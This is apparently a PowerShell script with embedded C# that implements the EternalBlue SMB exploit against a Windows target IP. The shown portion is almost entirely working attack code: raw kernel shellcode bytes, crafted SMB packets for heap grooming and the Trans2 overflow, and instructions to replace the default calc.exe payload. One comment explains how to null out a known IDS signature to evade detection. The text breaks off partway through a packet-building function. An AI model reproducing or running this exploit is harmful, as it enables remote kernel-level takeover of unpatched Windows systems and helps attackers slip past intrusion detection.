<#
.SYNOPSIS
This is a Powershell script with embedded C# code to exploit the Eternal Blue Vulnerability.
.DESCRIPTION
This Powershell script will expliot the vulnerable Windows machine running SMV using the embedded c# code. 
This script is based on Eternal Blue metasploit module by Sean Dillon <sean.dillon@risksense.com>',  # @zerosum0x0 'Dylan Davis <dylan.davis@risksense.com>',  # @jennamagius
By Default the current shellcode executes 'calc.exe' (can be changed in the c# code). 

.PARAMETER Target
IP address of the Vulnerable Windows Machine
.PARAMETER Grooms
Number of grooms to Build
.PARAMETER MaxAttempts
Number of times to attempt the exploit 

.EXAMPLE
.\EternalBlue_csembed.ps1 -Target 192.168.97.134 -Grooms 12 -MaxAttempts 5

.NOTES
You will need to change the shellcode in the run() method.
By Default the shellcode will execute 'calc.exe' 
#>


Param(
    [Parameter(Mandatory=$True)]
    [string]$Target,
    [Parameter(Mandatory=$True)]
    [int]$Grooms,
    [Parameter(Mandatory=$True)]
    [int]$MaxAttempts
)


$Source = @" 
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Net;
using System.Threading;
using System.Net.Sockets;
using System.Threading.Tasks;

namespace Windows.Exploits
{
    public class EternalBlue
    {
        
        static private int GROOM_DELTA = 5;
        

        private struct SMBHeader
        {
            public byte[] server_component;
            public byte smb_command;
            public byte error_class;
            public byte reserved1;
            public byte[] error_code;
            public byte flags;
            public byte[] flags2;
            public byte[] process_id_high;
            public byte[] signature;
            public byte[] reserved2;
            public byte[] tree_id;
            public byte[] process_id;
            public byte[] user_id;
            public byte[] multiplex_id;
        }


        static private byte[] Combine(byte[] a, byte[] b)
        {
            byte[] c = new byte[a.Length + b.Length];
            System.Buffer.BlockCopy(a, 0, c, 0, a.Length);
            System.Buffer.BlockCopy(b, 0, c, a.Length, b.Length);
            return c;
        }


        static private byte[] CreateSpecialByteArray(byte b,int length)
        {
            var arr = new byte[length];
            for (int i = 0; i < arr.Length; i++)
            {
                arr[i] = b;
            }
            return arr;
        }


        static byte[] make_kernel_shellcode()
        {
            byte[] kernel_shellcode = new byte[] {0xB9,0x82,0x00,0x00,0xC0,0x0F,0x32,0x48,0xBB,0xF8,0x0F,0xD0,0xFF,0xFF,0xFF,0xFF,
0xFF,0x89,0x53,0x04,0x89,0x03,0x48,0x8D,0x05,0x0A,0x00,0x00,0x00,0x48,0x89,0xC2,
0x48,0xC1,0xEA,0x20,0x0F,0x30,0xC3,0x0F,0x01,0xF8,0x65,0x48,0x89,0x24,0x25,0x10,
0x00,0x00,0x00,0x65,0x48,0x8B,0x24,0x25,0xA8,0x01,0x00,0x00,0x50,0x53,0x51,0x52,
0x56,0x57,0x55,0x41,0x50,0x41,0x51,0x41,0x52,0x41,0x53,0x41,0x54,0x41,0x55,0x41,
0x56,0x41,0x57,0x6A,0x2B,0x65,0xFF,0x34,0x25,0x10,0x00,0x00,0x00,0x41,0x53,0x6A,
0x33,0x51,0x4C,0x89,0xD1,0x48,0x83,0xEC,0x08,0x55,0x48,0x81,0xEC,0x58,0x01,0x00,
0x00,0x48,0x8D,0xAC,0x24,0x80,0x00,0x00,0x00,0x48,0x89,0x9D,0xC0,0x00,0x00,0x00,
0x48,0x89,0xBD,0xC8,0x00,0x00,0x00,0x48,0x89,0xB5,0xD0,0x00,0x00,0x00,0x48,0xA1,
0xF8,0x0F,0xD0,0xFF,0xFF,0xFF,0xFF,0xFF,0x48,0x89,0xC2,0x48,0xC1,0xEA,0x20,0x48,
0x31,0xDB,0xFF,0xCB,0x48,0x21,0xD8,0xB9,0x82,0x00,0x00,0xC0,0x0F,0x30,0xFB,0xE8,
0x38,0x00,0x00,0x00,0xFA,0x65,0x48,0x8B,0x24,0x25,0xA8,0x01,0x00,0x00,0x48,0x83,
0xEC,0x78,0x41,0x5F,0x41,0x5E,0x41,0x5D,0x41,0x5C,0x41,0x5B,0x41,0x5A,0x41,0x59,
0x41,0x58,0x5D,0x5F,0x5E,0x5A,0x59,0x5B,0x58,0x65,0x48,0x8B,0x24,0x25,0x10,0x00,
0x00,0x00,0x0F,0x01,0xF8,0xFF,0x24,0x25,0xF8,0x0F,0xD0,0xFF,0x56,0x41,0x57,0x41,
0x56,0x41,0x55,0x41,0x54,0x53,0x55,0x48,0x89,0xE5,0x66,0x83,0xE4,0xF0,0x48,0x83,
0xEC,0x20,0x4C,0x8D,0x35,0xE3,0xFF,0xFF,0xFF,0x65,0x4C,0x8B,0x3C,0x25,0x38,0x00,
0x00,0x00,0x4D,0x8B,0x7F,0x04,0x49,0xC1,0xEF,0x0C,0x49,0xC1,0xE7,0x0C,0x49,0x81,
0xEF,0x00,0x10,0x00,0x00,0x49,0x8B,0x37,0x66,0x81,0xFE,0x4D,0x5A,0x75,0xEF,0x41,
0xBB,0x5C,0x72,0x11,0x62,0xE8,0x18,0x02,0x00,0x00,0x48,0x89,0xC6,0x48,0x81,0xC6,
0x08,0x03,0x00,0x00,0x41,0xBB,0x7A,0xBA,0xA3,0x30,0xE8,0x03,0x02,0x00,0x00,0x48,
0x89,0xF1,0x48,0x39,0xF0,0x77,0x11,0x48,0x8D,0x90,0x00,0x05,0x00,0x00,0x48,0x39,
0xF2,0x72,0x05,0x48,0x29,0xC6,0xEB,0x08,0x48,0x8B,0x36,0x48,0x39,0xCE,0x75,0xE2,
0x49,0x89,0xF4,0x31,0xDB,0x89,0xD9,0x83,0xC1,0x04,0x81,0xF9,0x00,0x00,0x01,0x00,
0x0F,0x8D,0x66,0x01,0x00,0x00,0x4C,0x89,0xF2,0x89,0xCB,0x41,0xBB,0x66,0x55,0xA2,
0x4B,0xE8,0xBC,0x01,0x00,0x00,0x85,0xC0,0x75,0xDB,0x49,0x8B,0x0E,0x41,0xBB,0xA3,
0x6F,0x72,0x2D,0xE8,0xAA,0x01,0x00,0x00,0x48,0x89,0xC6,0xE8,0x50,0x01,0x00,0x00,
0x41,0x81,0xF9,0xBF,0x77,0x1F,0xDD,0x75,0xBC,0x49,0x8B,0x1E,0x4D,0x8D,0x6E,0x10,
0x4C,0x89,0xEA,0x48,0x89,0xD9,0x41,0xBB,0xE5,0x24,0x11,0xDC,0xE8,0x81,0x01,0x00,
0x00,0x6A,0x40,0x68,0x00,0x10,0x00,0x00,0x4D,0x8D,0x4E,0x08,0x49,0xC7,0x01,0x00,
0x10,0x00,0x00,0x4D,0x31,0xC0,0x4C,0x89,0xF2,0x31,0xC9,0x48,0x89,0x0A,0x48,0xF7,
0xD1,0x41,0xBB,0x4B,0xCA,0x0A,0xEE,0x48,0x83,0xEC,0x20,0xE8,0x52,0x01,0x00,0x00,
0x85,0xC0,0x0F,0x85,0xC8,0x00,0x00,0x00,0x49,0x8B,0x3E,0x48,0x8D,0x35,0xE9,0x00,
0x00,0x00,0x31,0xC9,0x66,0x03,0x0D,0xD7,0x01,0x00,0x00,0x66,0x81,0xC1,0xF9,0x00,
0xF3,0xA4,0x48,0x89,0xDE,0x48,0x81,0xC6,0x08,0x03,0x00,0x00,0x48,0x89,0xF1,0x48,
0x8B,0x11,0x4C,0x29,0xE2,0x51,0x52,0x48,0x89,0xD1,0x48,0x83,0xEC,0x20,0x41,0xBB,
0x26,0x40,0x36,0x9D,0xE8,0x09,0x01,0x00,0x00,0x48,0x83,0xC4,0x20,0x5A,0x59,0x48,
0x85,0xC0,0x74,0x18,0x48,0x8B,0x80,0xC8,0x02,0x00,0x00,0x48,0x85,0xC0,0x74,0x0C,
0x48,0x83,0xC2,0x4C,0x8B,0x02,0x0F,0xBA,0xE0,0x05,0x72,0x05,0x48,0x8B,0x09,0xEB,
0xBE,0x48,0x83,0xEA,0x4C,0x49,0x89,0xD4,0x31,0xD2,0x80,0xC2,0x90,0x31,0xC9,0x41,
0xBB,0x26,0xAC,0x50,0x91,0xE8,0xC8,0x00,0x00,0x00,0x48,0x89,0xC1,0x4C,0x8D,0x89,
0x80,0x00,0x00,0x00,0x41,0xC6,0x01,0xC3,0x4C,0x89,0xE2,0x49,0x89,0xC4,0x4D,0x31,
0xC0,0x41,0x50,0x6A,0x01,0x49,0x8B,0x06,0x50,0x41,0x50,0x48,0x83,0xEC,0x20,0x41,
0xBB,0xAC,0xCE,0x55,0x4B,0xE8,0x98,0x00,0x00,0x00,0x31,0xD2,0x52,0x52,0x41,0x58,
0x41,0x59,0x4C,0x89,0xE1,0x41,0xBB,0x18,0x38,0x09,0x9E,0xE8,0x82,0x00,0x00,0x00,
0x4C,0x89,0xE9,0x41,0xBB,0x22,0xB7,0xB3,0x7D,0xE8,0x74,0x00,0x00,0x00,0x48,0x89,
0xD9,0x41,0xBB,0x0D,0xE2,0x4D,0x85,0xE8,0x66,0x00,0x00,0x00,0x48,0x89,0xEC,0x5D,
0x5B,0x41,0x5C,0x41,0x5D,0x41,0x5E,0x41,0x5F,0x5E,0xC3,0xE9,0xB5,0x00,0x00,0x00,
0x4D,0x31,0xC9,0x31,0xC0,0xAC,0x41,0xC1,0xC9,0x0D,0x3C,0x61,0x7C,0x02,0x2C,0x20,
0x41,0x01,0xC1,0x38,0xE0,0x75,0xEC,0xC3,0x31,0xD2,0x65,0x48,0x8B,0x52,0x60,0x48,
0x8B,0x52,0x18,0x48,0x8B,0x52,0x20,0x48,0x8B,0x12,0x48,0x8B,0x72,0x50,0x48,0x0F,
0xB7,0x4A,0x4A,0x45,0x31,0xC9,0x31,0xC0,0xAC,0x3C,0x61,0x7C,0x02,0x2C,0x20,0x41,
0xC1,0xC9,0x0D,0x41,0x01,0xC1,0xE2,0xEE,0x45,0x39,0xD9,0x75,0xDA,0x4C,0x8B,0x7A,
0x20,0xC3,0x4C,0x89,0xF8,0x41,0x51,0x41,0x50,0x52,0x51,0x56,0x48,0x89,0xC2,0x8B,
0x42,0x3C,0x48,0x01,0xD0,0x8B,0x80,0x88,0x00,0x00,0x00,0x48,0x01,0xD0,0x50,0x8B,
0x48,0x18,0x44,0x8B,0x40,0x20,0x49,0x01,0xD0,0x48,0xFF,0xC9,0x41,0x8B,0x34,0x88,
0x48,0x01,0xD6,0xE8,0x78,0xFF,0xFF,0xFF,0x45,0x39,0xD9,0x75,0xEC,0x58,0x44,0x8B,
0x40,0x24,0x49,0x01,0xD0,0x66,0x41,0x8B,0x0C,0x48,0x44,0x8B,0x40,0x1C,0x49,0x01,
0xD0,0x41,0x8B,0x04,0x88,0x48,0x01,0xD0,0x5E,0x59,0x5A,0x41,0x58,0x41,0x59,0x41,
0x5B,0x41,0x53,0xFF,0xE0,0x56,0x41,0x57,0x55,0x48,0x89,0xE5,0x48,0x83,0xEC,0x20,
0x41,0xBB,0xDA,0x16,0xAF,0x92,0xE8,0x4D,0xFF,0xFF,0xFF,0x31,0xC9,0x51,0x51,0x51,
0x51,0x41,0x59,0x4C,0x8D,0x05,0x1A,0x00,0x00,0x00,0x5A,0x48,0x83,0xEC,0x20,0x41,
0xBB,0x46,0x45,0x1B,0x22,0xE8,0x68,0xFF,0xFF,0xFF,0x48,0x89,0xEC,0x5D,0x41,0x5F,
0x5E,0xC3};             //Kernal shell code
            return kernel_shellcode;
        }


        static byte[] make_kernel_user_payload(byte[] ring3)
        {
            byte[] sc = Combine(make_kernel_shellcode(), BitConverter.GetBytes((UInt16) ring3.Length));
            sc =  Combine(sc, ring3);
            
            return sc;
        }


        static byte[] make_smb2_payload_headers_packet()
        {
            byte[] packet = Combine(new byte[] { 0x00, 0x00, 0xff, 0xf7, 0xfe }, Encoding.ASCII.GetBytes("SMB"));
            packet = Combine(packet, new byte[124]);
            
            return packet;
        }


        static byte[] make_smb2_payload_body_packet(byte[] kernel_user_payload)
        {
            int pkt_max_len = 4204;
            int pkt_setup_len = 497;
            int pkt_max_payload = pkt_max_len - pkt_setup_len;

            //padding
            byte[] pkt = new byte[8];
            pkt = Combine(pkt , new byte[] { 0x03, 0x00, 0x00, 0x00 });
            pkt = Combine(pkt, new byte[28] );
            pkt = Combine(pkt, new byte[] { 0x03, 0x00, 0x00, 0x00 });
            pkt = Combine(pkt, new byte[116] );

            // KI_USER_SHARED_DATA addresses
            pkt = Combine(pkt, new byte[] { 0xb0, 0x00, 0xd0, 0xff, 0xff, 0xff, 0xff, 0xff });  // x64 address
            pkt = Combine(pkt, new byte[] { 0xb0, 0x00, 0xd0, 0xff, 0xff, 0xff, 0xff, 0xff });
            pkt = Combine(pkt, new byte[16] );
            pkt = Combine(pkt, new byte[] { 0xc0, 0xf0, 0xdf, 0xff });              // x86 address
            pkt = Combine(pkt, new byte[] { 0xc0, 0xf0, 0xdf, 0xff });
            pkt = Combine(pkt, new byte[196] );

            //payload addreses
            pkt = Combine(pkt, new byte[] { 0x90, 0xf1, 0xdf, 0xff });
            pkt = Combine(pkt, new byte[4] );
            pkt = Combine(pkt, new byte[] { 0xf0, 0xf1, 0xdf, 0xff });
            pkt = Combine(pkt, new byte[64] );

            pkt = Combine(pkt, new byte[] { 0xf0, 0x01, 0xd0, 0xff, 0xff, 0xff, 0xff, 0xff });
            pkt = Combine(pkt, new byte[8] );
            pkt = Combine(pkt, new byte[] { 0x00, 0x02, 0xd0, 0xff, 0xff, 0xff, 0xff, 0xff });
            pkt = Combine(pkt, new byte[] { 0x00 } );

            pkt = Combine(pkt, kernel_user_payload);

            // fill out the rest, this can be randomly generated
            // pkt = Combine(pkt, new byte[pkt_max_payload - kernel_user_payload.Length]);
            pkt = Combine(pkt, new byte[] { 0x00 });
            
            return pkt;
        }


        static byte[] make_smb1_echo_packet(byte[] tree_id, byte[] user_id)
        {
            byte[] pkt = new byte[] { 0x00 };                           // type
            pkt = Combine(pkt, new byte[] { 0x00, 0x00, 0x31 });        // len = 49
            pkt = Combine(pkt, Combine(new byte[] { 0xff }, Encoding.ASCII.GetBytes("SMB")));   // SMB1
            pkt = Combine(pkt, new byte[] { 0x2b });                    // Echo
            pkt = Combine(pkt, new byte[] { 0x00, 0x00, 0x00, 0x00 });  // Success
            pkt = Combine(pkt, new byte[] { 0x18 });                    // flags
            pkt = Combine(pkt, new byte[] { 0x07, 0xc0 });              // flags2
            pkt = Combine(pkt, new byte[] { 0x00, 0x00 });              // PID High
            pkt = Combine(pkt, new byte[] { 0x00, 0x00, 0x00, 0x00 });  // Signature1
            pkt = Combine(pkt, new byte[] { 0x00, 0x00, 0x00, 0x00 });  // Signature2
            pkt = Combine(pkt, new byte[] { 0x00, 0x00 });              // Reserved
            pkt = Combine(pkt, tree_id);                                // Tree ID
            pkt = Combine(pkt, new byte[] { 0xff, 0xfe });              // PID
            pkt = Combine(pkt, user_id);                                // UserID
            pkt = Combine(pkt, new byte[] { 0x40, 0x00 });              // MultiplexIDs
            pkt = Combine(pkt, new byte[] { 0x01 });                    // Word count
            pkt = Combine(pkt, new byte[] { 0x01, 0x00 });              // Echo count
            pkt = Combine(pkt, new byte[] { 0x0c, 0x00 });              // Byte count

            // echo data
            // this is an existing IDS signature, and can be nulled out
            //$pkt += 0x4a,0x6c,0x4a,0x6d,0x49,0x68,0x43,0x6c,0x42,0x73,0x72,0x00
            pkt = Combine(pkt, new byte[] { 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x00 });
            
            return pkt;
        }
        

        static byte[] make_smb1_trans2_exploit_packet(byte[] tree_id, byte[] user_id, String type, int timeout)
        {
            timeout = (timeout * 16) + 3;

            byte[] pkt = new byte[] { 0x00 };                   // Session message
            pkt = Combine(pkt, new byte[] { 0x00, 0x10, 0x35 });    // length
            pkt = Combine(pkt, new byte[] { 0xff, 0x53, 0x4D, 0x42 });  // SMB1
            pkt = Combine(pkt, new byte[] { 0x33 });                // Trans2 request
            pkt = Combine(pkt, new byte[] { 0x00, 0x00, 0x00, 0x00 });  // NT SUCCESS
            pkt = Combine(pkt, new byte[] { 0x18 });                    // Flags
            pkt = Combine(pkt, new byte[] { 0x07, 0xc0 });              // Flags2
            pkt = Combine(pkt, new byte[] { 0x00, 0x00 });              // PID High
            pkt = Combine(pkt, new byte[] { 0x00, 0x00, 0x00, 0x00 });  // Signature1
            pkt = Combine(pkt, new byte[] { 0x00, 0x00, 0x00, 0x00 });  // Signature2
            pkt = Combine(pkt, new byte[] { 0x00, 0x00 });              // Reserved
            pkt = Combine(pkt, user_id);                                // TreeID
            pkt = Combine(pkt, new byte[] { 0xff, 0xfe });              // PID
            pkt = Combine(pkt, user_id);                                // UserID   
            pkt = Combine(pkt, new byte[] { 0x40, 0x00 });              // MultiplexIDs

            pkt = Combine(pkt, new byte[] { 0x09 });                    // Word Count
            pkt = Combine(pkt, new byte[] { 0x00, 0x00 });              // Total Param Count
            pkt = Combine(pkt, new byte[] { 0x00, 0x10 });              // Total Data Count
            pkt = Combine(pkt, new byte[] { 0x00, 0x00 });              // Max Param Count
            pkt = Combine(pkt, new byte[] { 0x00, 0x00 });              // Max Data Count
            pkt = Combine(pkt, new byte[] { 0x00 });                    // Max Setup Count
            pkt = Combine(pkt, new byte[] { 0x00 });                    // Reserved
            pkt = Combine(pkt, new byte[] { 0x00, 0x10 });              // Flags
            pkt = Combine(pkt, new byte[] { 0x35, 0x00, 0xd0 });        // Timeouts
            pkt = Combine(pkt, new byte[] {BitConverter.GetBytes(timeout)[0]});         // Timeout is a single int
            pkt = Combine(pkt, new byte[] { 0x00, 0x00 });              // Reserved
            pkt = Combine(pkt, new byte[] { 0x00, 0x10 });              // Parameter Count

            //pkt = Combine(pkt, new byte[] { 0x74, 0x70 });              // Parameter Offset
            //pkt = Combine(pkt, new byte[] { 0x47, 0x46 });              // Data Count
            //pkt = Combine(pkt, new byte[] { 0x45, 0x6f });              // Data Offset
            //pkt = Combine(pkt, new byte[] { 0x4c });                    // Setup Count
            //pkt = Combine(pkt, new byte[] { 0x4f });                    // Reserved
            

            if (type.Equals("eb_trans2_exploit"))
            {
                pkt = Combine(pkt, CreateSpecialByteArray(0x41,2957));

                pkt = Combine(pkt, new byte[] { 0x80, 0x00, 0xa8, 0x00 });  // overflow

                pkt = Combine(pkt, new byte[16] );
                pkt = Combine(pkt, new byte[] { 0xff, 0xff });
                pkt = Combine(pkt, new byte[6]);
                pkt = Combine(pkt, new byte[] { 0xff, 0xff });
                pkt = Combine(pkt, new byte[22] );

                pkt = Combine(pkt, new byte[] { 0x00, 0xf1, 0xdf, 0xff });  //x86 addresses
                pkt = Combine(pkt, new byte[8] );
                pkt = Combine(pkt, new byte[] { 0x20, 0xf0, 0xdf, 0xff });

                pkt = Combine(pkt, new byte[] { 0x00, 0xf1, 0xdf, 0xff, 0xff, 0xff, 0xff, 0xff });  // x64

                pkt = Combine(pkt, new byte[] { 0x60, 0x00, 0x04, 0x10 });
                pkt = Combine(pkt, new byte[4] );

                pkt = Combine(pkt, new byte[] { 0x80, 0xef, 0xdf, 0xff });

                pkt = Combine(pkt, new byte[4] );
                pkt = Combine(pkt, new byte[] { 0x10, 0x00, 0xd0, 0xff, 0xff, 0xff, 0xff, 0xff });
                pkt = Combine(pkt, new byte[] { 0x18, 0x01, 0xd0, 0xff, 0xff, 0xff, 0xff, 0xff });
                pkt = Combine(pkt, new byte[16] );

                pkt = Combine(pkt, new byte[] { 0x60, 0x00, 0x04, 0x10 });
                pkt = Combine(pkt, new byte[12] );
                pkt = Combine(pkt, new byte[] { 0x90, 0xff, 0xcf, 0xff, 0xff, 0xff, 0xff, 0xff });
                pkt = Combine(pkt, new byte[8] );
                pkt = Combine(pkt, new byte[] { 0x80, 0x10 });
                pkt = Combine(pkt, new byte[14] );
                pkt = Combine(pkt, new byte[] { 0x39 });
                pkt = Combine(pkt, new byte[] { 0xbb });

                pkt = Combine(pkt, CreateSpecialByteArray(0x41,965));
                
                return pkt;
            }
            if (type.Equals("eb_trans2_zero"))
            {
                pkt = Combine(pkt, new byte[2055]);
                pkt = Combine(pkt, new byte[] { 0x83, 0xf3 });
                pkt = Combine(pkt, CreateSpecialByteArray(0x41,2039));
                //pkt = Combine(pkt, new byte[4096]);
            }
            else
            {
                pkt = Combine(pkt, CreateSpecialByteArray(0x41,4096));
            }
            
            return pkt;
        }


        static byte[] negotiate_proto_request()
        {
            byte[] pkt = new byte[] { 0x00 };                       //Message type
            pkt = Combine(pkt, new byte[] { 0x00, 0x00, 0x54 });    // Length

            pkt = Combine(pkt, new byte[] { 0xFF, 0x53, 0x4D, 0x42 });  //server_component: .SMB
            pkt = Combine(pkt, new byte[] { 0x72 });                    //smb_command: Negotiate Protocol
            pkt = Combine(pkt, new byte[] { 0x00, 0x00, 0x00, 0x00 });  // nt_status
            pkt = Combine(pkt, new byte[] { 0x18 });                    //flags
            pkt = Combine(pkt, new byte[] { 0x01, 0x28 });              //flags2
            pkt = Combine(pkt, new byte[] { 0x00, 0x00 });              //process_id_high
            pkt = Combine(pkt, new byte[] { 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 });  // signature
            pkt = Combine(pkt, new byte[] { 0x00, 0x00 });              //reserved
            pkt = Combine(pkt, new byte[] { 0x00, 0x00 });              //tree_id
            pkt = Combine(pkt, new byte[] { 0x2F, 0x4B });              //process_id
            pkt = Combine(pkt, new byte[] { 0x00, 0x00 });              //user_id
            pkt = Combine(pkt, new byte[] { 0xC5, 0x5E });              //multiplex_id

            pkt = Combine(pkt, new byte[] { 0x00 });                    //word_count
            pkt = Combine(pkt, new byte[] { 0x31, 0x00 });              //byte_count

            // Requested Dialects
            pkt = Combine(pkt, new byte[] { 0x02 });                    //dialet_buffer_format
            pkt = Combine(pkt, new byte[] { 0x4C, 0x41, 0x4E, 0x4D, 0x41, 0x4E, 0x31, 0x2E, 0x30, 0x00 });  //dialet_name: LANMAN1.0

            pkt = Combine(pkt, new byte[] { 0x02 });                    //dialet_buffer_format
            pkt = Combine(pkt, new byte[] { 0x4C, 0x4D, 0x31, 0x2E, 0x32, 0x58, 0x30, 0x30, 0x32, 0x00 });  //dialet_name: LM1.2X002

            pkt = Combine(pkt, new byte[] { 0x02 });                    //dialet_buffer_format
            pkt = Combine(pkt, new byte[] { 0x4E, 0x54, 0x20, 0x4C, 0x41, 0x4E, 0x4D, 0x41, 0x4E, 0x20, 0x31, 0x2E, 0x30, 0x00 });  //dialet_name3: NT LANMAN 1.0

            pkt = Combine(pkt, new byte[] { 0x02 });                    //dialet_buffer_format
            pkt = Combine(pkt, new byte[] { 0x4E, 0x54, 0x20, 0x4C, 0x4D, 0x20, 0x30, 0x2E, 0x31, 0x32, 0x00 });  // dialet_name4: NT LM 0.12

            

            return pkt;
        }


        static byte[] make_smb1_nt_trans_packet(byte[] tree_id,byte[] user_id)
        {
            byte[] pkt = new byte[] { 0x00 };           // Session message
            pkt = Combine(pkt, new byte[] { 0x00, 0x04, 0x38 });        // length
            pkt = Combine(pkt, new byte[] { 0xff, 0x53, 0x4D, 0x42 });  // SMB1
            pkt = Combine(pkt, new byte[] { 0xa0 });                    // NT Trans
            pkt = Combine(pkt, new byte[] { 0x00, 0x00, 0x00, 0x00 });  //NT Success
            pkt = Combine(pkt, new byte[] { 0x18 });                    //Flags
            pkt = Combine(pkt, new byte[] { 0x07, 0xc0 });              //Flags2
            pkt = Combine(pkt, new byte[] { 0x00, 0x00 });              // PID high
            pkt = Combine(pkt, new byte[] { 0x00, 0x00, 0x00, 0x00 });  //Signature1
            pkt = Combine(pkt, new byte[] { 0x00, 0x00, 0x00, 0x00 });  //Signature2
            pkt = Combine(pkt, new byte[] { 0x00, 0x00 });              //Reserved
            pkt = Combine(pkt, tree_id);                                //TreeID
            pkt = Combine(pkt, new byte[] { 0xff, 0xfe });              //PID
            pkt = Combine(pkt, user_id);                                //UserID
            pkt = Combine(pkt, new byte[] { 0x40, 0x00 });              //MultiplexID
            
            pkt = Combine(pkt, new byte[] { 0x14 });                    //Word Count
            pkt = Combine(pkt, new byte[] { 0x01 });                    //Max Setup Count
            pkt = Combine(pkt, new byte[] { 0x00, 0x00 });              //Reserved
            pkt = Combine(pkt, new byte[] { 0x1e, 0x00, 0x00, 0x00 });  //Total Param Count
            pkt = Combine(pkt, new byte[] { 0xd0, 0x03, 0x01, 0x00 });  //Total Data Count
            pkt = Combine(pkt, new byte[] { 0x1e, 0x00, 0x00, 0x00 });  //Max Param Count
            pkt = Combine(pkt, new byte[] { 0x00, 0x00, 0x00, 0x00 });  //Max Data Count
            pkt = Combine(pkt, new byte[] { 0x1e, 0x00, 0x00, 0x00 });  //Param Count
            pkt = Combine(pkt, new byte[] { 0x4b, 0x00, 0x00, 0x00 });  //Param Offset
            pkt = Combine(pkt, new byte[] { 0xd0, 0x03, 0x00, 0x00 });  //Data Count
            pkt = Combine(pkt, new byte[] { 0x68, 0x00, 0x00, 0x00 });  //Data Offset
            pkt = Combine(pkt, new byte[] { 0x01 });                    //Setup Count
            pkt = Combine(pkt, new byte[] { 0x00, 0x00 });              //Function <unknown>
            pkt = Combine(pkt, new byte[] { 0x00, 0x00 });              //Unknown NT transaction (0) setup
            pkt = Combine(pkt, new byte[] { 0xec,0x03 });               //Byte Count
            pkt = Combine(pkt, new byte[31] );                      //NT Parameters

            // undocumented
            pkt = Combine(pkt, new byte[] { 0x01 });
            pkt = Combine(pkt, new byte[973] );

            

            return pkt;
        }


        static byte[] make_smb1_free_hole_session_packet(byte[] flags2,byte[] vcnum,byte[] native_os)
        {
            byte[] pkt = new byte[] { 0x00 };       //Session message
            pkt = Combine(pkt, new byte[] { 0x00, 0x00, 0x51 });    //length
            pkt = Combine(pkt, new byte[] { 0xff, 0x53, 0x4D, 0x42 });    //SMB1
            pkt = Combine(pkt, new byte[] { 0x73 });    //Session Setup AndX
            pkt = Combine(pkt, new byte[] { 0x00, 0x00, 0x00, 0x00 });      //NT SUCCESS
            pkt = Combine(pkt, new byte[] { 0x18 });        //Flags
            pkt = Combine(pkt, flags2);                     //Flags2
            pkt = Combine(pkt, new byte[] { 0x00, 0x00 });        //PID High
            pkt = Combine(pkt, new byte[] { 0x00, 0x00, 0x00, 0x00 });        //Signature1
            pkt = Combine(pkt, new byte[] { 0x00, 0x00, 0x00, 0x00 });        //Signature2
            pkt = Combine(pkt, new byte[] { 0x00, 0x00 });        //Reserved
            pkt = Combine(pkt, new byte[] { 0x00, 0x00 });        //TreeID
            pkt = Combine(pkt, new byte[] { 0xff, 0xfe });        //PID
            pkt = Combine(pkt, new byte[] { 0x00, 0x00 });        //UserID
            pkt = Combine(pkt, new byte[] { 0x40, 0x00 });        //MultiplexID
            //pkt = Combine(pkt, new byte[] { 0x00, 0x00 });        //Reserved

            pkt = Combine(pkt, new byte[] { 0x0c });        //Work Count
            pkt = Combine(pkt, new byte[] { 0xff });        //No further commands
            pkt = Combine(pkt, new byte[] { 0x00});        //Reserved
            pkt = Combine(pkt, new byte[] { 0x00, 0x00 });        //AndXOffset
            pkt = Combine(pkt, new byte[] { 0x04, 0x11 });        //Max Buffer
            pkt = Combine(pkt, new byte[] { 0x0a, 0x00 });        //Max Mpx Count
            pkt = Combine(pkt, vcnum);        //VC Number
            pkt = Combine(pkt, new byte[] { 0x00, 0x00, 0x00, 0x00 });        //Session Key
            pkt = Combine(pkt, new byte[] { 0x00, 0x00 });        //Security blob length
            pkt = Combine(pkt, new byte[] { 0x00, 0x00, 0x00, 0x00 });        //Reserved
            pkt = Combine(pkt, new byte[] { 0x00, 0x00, 0x00, 0x80 });        //Capabilities
            pkt = Combine(pkt, new byte[] { 0x16, 0x00 });        //Byte count
            //pkt = Combine(pkt, new byte[] { 0xf0 });        //Security Blob: <MISSING>
            //pkt = Combine(pkt, new byte[] { 0xff, 0x00, 0x00, 0x00 });        //Native OS
            //pkt = Combine(pkt, new byte[] { 0x00, 0x00 });        //Native LAN manager
            //pkt = Combine(pkt, new byte[] { 0x00, 0x00 });        //Primary domain
            pkt = Combine(pkt, native_os);
            pkt = Combine(pkt, new byte[17] );        //Extra byte params

            

            return pkt;
        }


        static byte[] make_smb1_anonymous_login_packet()
        {
            // Neither Rex nor RubySMB appear to support Anon login?

            byte[] pkt = new byte[] { 0x00 };                    // Session message
            pkt = Combine(pkt, new byte[] { 0x00, 0x00, 0x88 });        //Length
            pkt = Combine(pkt, new byte[] { 0xff, 0x53, 0x4D, 0x42 });        //SMB1
            pkt = Combine(pkt, new byte[] { 0x73 });        //Session Steup AndX
            pkt = Combine(pkt, new byte[] { 0x00, 0x00, 0x00, 0x00 });        //NT SUCCESS
            pkt = Combine(pkt, new byte[] { 0x18 });        //Flags
            pkt = Combine(pkt, new byte[] { 0x07, 0xc0 });        //Flags2
            pkt = Combine(pkt, new byte[] { 0x00, 0x00 });        //PID High
            pkt = Combine(pkt, new byte[] { 0x00, 0x00, 0x00, 0x00 });        //Signature1
            pkt = Combine(pkt, new byte[] { 0x00, 0x00, 0x00, 0x00 });        //Signature2
            pkt = Combine(pkt, new byte[] { 0x00, 0x00 });        //TreeID
            pkt = Combine(pkt, new byte[] { 0xff, 0xfe });        //PID
            pkt = Combine(pkt, new byte[] { 0x00,0x00 });        //Reserved
            pkt = Combine(pkt, new byte[] { 0x00,0x00 });        //UserID
            pkt = Combine(pkt, new byte[] { 0x40,0x00 });        //MultiplexID

            pkt = Combine(pkt, new byte[] { 0x0d });        //Word Count
            pkt = Combine(pkt, new byte[] { 0xff });        //No Further Commands
            pkt = Combine(pkt, new byte[] { 0x00 });        //Reserved
            pkt = Combine(pkt, new byte[] { 0x88,0x00 });        //AndXOffset
            pkt = Combine(pkt, new byte[] { 0x04, 0x11 });        //Max Buffer
            pkt = Combine(pkt, new byte[] { 0x0a, 0x00 });        //Max Mpx Count
            pkt = Combine(pkt, new byte[] { 0x00, 0x00 });        //VC Number
            pkt = Combine(pkt, new byte[] { 0x00, 0x00, 0x00, 0x00 });        //Sessioin Key
            pkt = Combine(pkt, new byte[] { 0x01, 0x00 });        //Ansi pw length
